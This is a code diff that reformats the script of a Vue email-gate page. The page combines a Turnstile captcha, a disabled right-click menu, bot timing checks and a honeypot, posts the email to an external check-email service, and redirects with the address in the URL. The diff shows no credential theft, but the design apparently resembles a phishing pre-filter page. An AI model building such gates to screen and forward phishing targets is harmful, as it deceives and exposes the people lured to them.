@@ -1,4 +1,3 @@
-
 <template>
   <div v-if="!captchaToken" class="gate-container">
     <main>
@@ -73,7 +72,93 @@
 </template>
 
 <script setup>
-onMounted(() => {document.addEventListener('contextmenu', e => e.preventDefault());});import { ref, onMounted, nextTick } from 'vue'const email = ref('')const honeypot = ref('')const error = ref('')const loading = ref(false)const captchaToken = ref(null)const pageLoadTime = Date.now()let holdTimer = nullconst holdDuration = 1500const redirectBaseUrl = 'https://yourdomain.com/complete'onMounted(async () => {await nextTick()if (window.turnstile) {window.turnstile.render('.cf-turnstile', {sitekey: '0x4AAAAAABgei6QZruCN7n08',callback: (token) => {captchaToken.value = token}})}})function isValidEmail(e) {return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e)}async function verifyEmail() {try {const timeSinceLoad = Date.now() - pageLoadTimeif (timeSinceLoad < 2000) {error.value = 'Too fast. Please try again.'return}if (honeypot.value) {error.value = 'Bot-like activity detected.'return}const res = await fetch('https://email-verification-app-production-8ea5.up.railway.app/api/check-email',{method: 'POST',headers: { 'Content-Type': 'application/json' },body: JSON.stringify({email: email.value,captchaToken: captchaToken.value}),})const data = await res.json()if (!res.ok || !data.valid) {throw new Error(data.message || 'Verification failed')}window.location.href = `${redirectBaseUrl}?email=${encodeURIComponent(email.value)}`} catch (err) {error.value = err.message} finally {loading.value = false}}function startHold() {if (!email.value.trim()) {error.value = 'Please enter your email.'return}if (!isValidEmail(email.value)) {error.value = 'Invalid email format.'return}error.value = ''loading.value = trueholdTimer = setTimeout(verifyEmail, holdDuration)}function endHold() {if (holdTimer) clearTimeout(holdTimer)loading.value = false}function cancelHold() {if (holdTimer) clearTimeout(holdTimer)loading.value = false}
+onMounted(() => {document.addEventListener('contextmenu', e => e.preventDefault());});
+import { ref, onMounted, nextTick } from 'vue'
+const email = ref('')
+const honeypot = ref('')
+const error = ref('')
+const loading = ref(false)
+const captchaToken = ref(null)
+const pageLoadTime = Date.now()
+let holdTimer = null
+const holdDuration = 1500
+const redirectBaseUrl = 'https://yourdomain.com/complete'
+
+onMounted(async () => {
+  await nextTick()
+  if (window.turnstile) {
+    window.turnstile.render('.cf-turnstile', {
+      sitekey: '0x4AAAAAABgei6QZruCN7n08',
+      callback: (token) => {
+        captchaToken.value = token
+      }
+    })
+  }
+})
+
+function isValidEmail(e) {
+  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e)
+}
+
+async function verifyEmail() {
+  try {
+    const timeSinceLoad = Date.now() - pageLoadTime
+    if (timeSinceLoad < 2000) {
+      error.value = 'Too fast. Please try again.'
+      return
+    }
+
+    if (honeypot.value) {
+      error.value = 'Bot-like activity detected.'
+      return
+    }
+
+    const res = await fetch(
+      'https://email-verification-app-production-8ea5.up.railway.app/api/check-email',
+      {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          email: email.value,
+          captchaToken: captchaToken.value
+        }),
+      }
+    )
+    const data = await res.json()
+    if (!res.ok || !data.valid) {
+      throw new Error(data.message || 'Verification failed')
+    }
+    window.location.href = `${redirectBaseUrl}?email=${encodeURIComponent(email.value)}`
+  } catch (err) {
+    error.value = err.message
+  } finally {
+    loading.value = false
+  }
+}
+
+function startHold() {
+  if (!email.value.trim()) {
+    error.value = 'Please enter your email.'
+    return
+  }
+  if (!isValidEmail(email.value)) {
+    error.value = 'Invalid email format.'
+    return
+  }
+  error.value = ''
+  loading.value = true
+  holdTimer = setTimeout(verifyEmail, holdDuration)
+}
+
+function endHold() {
+  if (holdTimer) clearTimeout(holdTimer)
+  loading.value = false
+}
+
+function cancelHold() {
+  if (holdTimer) clearTimeout(holdTimer)
+  loading.value = false
+}
 </script>
 
 <style scoped>
